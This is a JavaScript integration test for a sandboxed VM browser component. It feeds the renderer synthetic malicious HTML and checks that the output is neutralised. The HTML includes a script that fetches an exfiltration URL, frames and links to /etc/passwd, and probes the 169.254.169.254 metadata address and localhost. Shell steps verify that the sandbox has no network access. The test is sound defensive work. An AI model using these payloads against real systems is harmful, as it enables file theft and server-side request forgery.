// Real VM and public HTTPS test. Only synthetic Vault data; no Provider calls.
import {mkdtemp,mkdir,realpath,writeFile,rm} from 'node:fs/promises';
import {join} from 'node:path';import assert from 'node:assert/strict';
import {VaultRegistry} from '../../dist/vault/registry.js';
import {VMJournal} from '../../dist/vault/vm-journal.js';
import {SharedVMController} from '../../dist/vault/shared-vm.js';
import {AppleOfflineBackend} from '../../dist/vault/apple-backend.js';
import {browserSnapshot,browserPage} from '../../dist/vault/browser.js';
const base=await realpath(await mkdtemp('/private/tmp/nidus-browser-real-'));await mkdir(join(base,'vault'));
const registry=new VaultRegistry(join(base,'registry')),vault=await registry.registerVault(join(base,'vault'));
let backend;const events=[];
const runtime=new SharedVMController(registry,new VMJournal(join(base,'runtime')),()=>{backend=new AppleOfflineBackend(process.argv[2]);backend.listeners.add(e=>events.push(e));return backend;},300000,undefined,true);
const evidence={scope:'Real Apple VM, public HTTPS and synthetic malicious HTML; programmatic approvals only',events};
try{
 await runtime.initialize();
 const proposal=await runtime.proposeBrowser(vault.vaultId,'live','page','browser_navigate','https://example.com/');
 evidence.approval=proposal;
 const live=await runtime.executeApproved(proposal.approvalId);evidence.live=live;
 assert.equal(live.exitCode,0);assert.equal(live.cleanupConfirmed,true);assert.match(live.browser.title,/Example Domain/);
 const html=`<title>Synthetic</title><h1>Safe visible text</h1><script>document.body.innerHTML='SCRIPT_EXECUTED';fetch('https://example.com/leak')</script><iframe src="file:///etc/passwd"></iframe><img src="http://169.254.169.254/"><img src="https://127.0.0.1/"><a href="https://example.org/">public link</a><a href="file:///etc/passwd">denied link</a><a download href="data:text/plain,secret">download</a><form action="https://example.org/" method="post"><input name="private"></form>`;
 const payload=await browserSnapshot({url:'https://example.com/',kind:'navigate'},vault.vaultId,vault.environmentId,new AbortController().signal,async()=>({status:200,contentType:'text/html',body:Buffer.from(html).toString('base64'),url:'https://example.com/',address:'93.184.215.14'}));
 const rendered=await backend.execute(crypto.randomUUID(),'/usr/bin/node /usr/lib/nidus/browser.mjs',30,{workspace:payload,profile:'browser'});evidence.synthetic=rendered;
 assert.equal(rendered.exitCode,0);assert.equal(rendered.cleanupConfirmed,true);
 const page=browserPage(rendered.stdout,'https://example.com/');assert.match(page.text,/Safe visible text/);assert.doesNotMatch(page.text,/SCRIPT_EXECUTED|root:x:/);assert.deepEqual(page.links.map(l=>l.url),['https://example.org/']);
 evidence.boundaries=await backend.execute(crypto.randomUUID(),"set -e; test ! -e /cache; test ! -e /dev/vda; test ! -e /tmp/browser-profile; /bin/busybox unshare -Ur /bin/busybox true; printf isolated",30,{profile:'browser'});assert.equal(evidence.boundaries.exitCode,0);
 const shell=await runtime.propose(vault.vaultId,'shell','check',"set -e; if /bin/busybox unshare -Ur /bin/busybox true; then exit 1; fi; python3 - <<'PY'\nimport socket\nfor address in ['1.1.1.1','127.0.0.1','169.254.169.254']:\n s=socket.socket();s.settimeout(.2)\n try:s.connect((address,443));raise RuntimeError('unexpected network')\n except OSError:pass\n finally:s.close()\nprint('shell-offline')\nPY");evidence.shell=await runtime.executeApproved(shell.approvalId);assert.equal(evidence.shell.exitCode,0);
 const search=await runtime.proposeBrowser(vault.vaultId,'search','search','browser_search','Apple Virtualization framework');
 try{evidence.search=await runtime.executeApproved(search.approvalId);assert.equal(evidence.search.exitCode,0);assert.ok(evidence.search.browser.text.length);}catch(e){evidence.searchError=String(e);}
 evidence.status='PASS';
}catch(e){evidence.status='FAIL';evidence.error=String(e);process.exitCode=1;}finally{try{await runtime.close();evidence.stop='STOP_CONFIRMED';}catch(e){evidence.stop=String(e);process.exitCode=1;}await writeFile(process.argv[3],JSON.stringify(evidence,null,2));if(evidence.stop==='STOP_CONFIRMED')await rm(base,{recursive:true,force:true});}
